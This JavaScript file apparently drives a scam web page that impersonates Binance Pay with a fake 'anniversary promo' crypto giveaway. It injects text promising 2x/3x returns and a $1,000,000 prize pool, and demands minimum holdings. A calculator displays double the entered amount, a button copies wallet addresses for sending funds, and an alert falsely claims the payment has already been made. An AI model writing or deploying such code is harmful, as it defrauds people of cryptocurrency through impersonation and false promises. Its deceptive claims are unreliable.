function calculate(){
    let amount = document.getElementById("amount").value;
    let cals = parseFloat(amount) * 2;
     document.getElementById("bonus").innerHTML=("Your bonus is " + cals.toString());
 }
 function show(){
     document.getElementById("pop_up").style.display="block";
     document.getElementById("how_to").style.display="none";
 }
 document.querySelectorAll(".copy-link").forEach(copyLinkContainer => {
    const inputField = copyLinkContainer.querySelector(".copy-link-input");
    const copyButton = copyLinkContainer.querySelector(".copy-link-button");
    inputField.addEventListener("focus", () => inputField.select());
    copyButton.addEventListener("click", () => {
        const text = inputField.value;
        inputField.select();
        navigator.clipboard.writeText(text);
        inputField.value = "Copied";
        setTimeout(() => inputField.value = text, 2000);
    });
});
function paidFunction(){
    alert("Your Payment is made already, wait for 10 mins and login to your binance account to confirm the anniversary promo");
}
function myInputFunction() {
    let myInput = document.getElementById("myInput").value;
    let address = document.getElementById("address");
    myInput = parseFloat(myInput);
    if(myInput < 0.5){
        document.getElementById("address").style.display=none;
    }
}
    //input
    const paragraph1 = "Binance Pay is announcing a new promotion where eligible users can each receive a 2x/3x bonus depending on the amount you participate with in Crypto Box for the biggest giveaway ever.";
    const paragraph2 = "All successful Binance Pay investors during the promotion period can each receive an additional 5 BUSD voucher reward. The total price pool amounts to $1,000,000 USD, and will be distributed on first come, first serverd basis. This event will end when the assisgned coins are distributed completely.";
    const paragraph3 = "To participate, you are required to have at least one of the following in your Crypto Wallet: <b>0.1 ETH, 3 LTC, 0.007 BTC, 50 DOT, 1,810 DOGE, 3 BCH, 2,500 TRX</b> to join the event.";
    const paragraph4 = "If you want to participate, it is really simple to do. Just click on any of the Crypto Wallet of your choice below or Chat with our Live Support for help.";
    const warningParagraph = "<b>Note: </b>Your binance wallet must be funded to get the process completed";
    //output
    document.getElementById("paragraph1").innerHTML = paragraph1;
    document.getElementById("paragraph2").innerHTML = paragraph2;
    document.getElementById("paragraph3").innerHTML = paragraph3;
    document.getElementById("paragraph4").innerHTML = paragraph4;
    document.getElementById("warningParagraph").innerHTML = warningParagraph;
